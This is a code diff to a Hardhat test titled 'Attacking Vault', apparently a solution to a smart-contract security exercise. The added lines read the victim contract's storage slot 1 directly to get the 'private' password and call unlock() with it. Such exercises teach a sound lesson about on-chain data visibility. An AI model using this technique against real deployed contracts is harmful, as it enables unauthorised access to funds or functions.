@@ -1,5 +1,5 @@
 import { expect } from "chai";
-import { ethers } from "hardhat";
+import { ethers, waffle } from "hardhat";
 
 let victim: any;
 let attacker;
@@ -21,6 +21,10 @@ describe("Attacking Vault", function () {
       Unlock the vault by somehow reading the private password from 
       Vault directly
     */
+    const provider = waffle.provider;
+    const storage = await provider.getStorageAt(victim.address, 1);
+    console.log("storage", storage);
+    await victim.unlock(storage);
   }
 
   // Get this to pass!
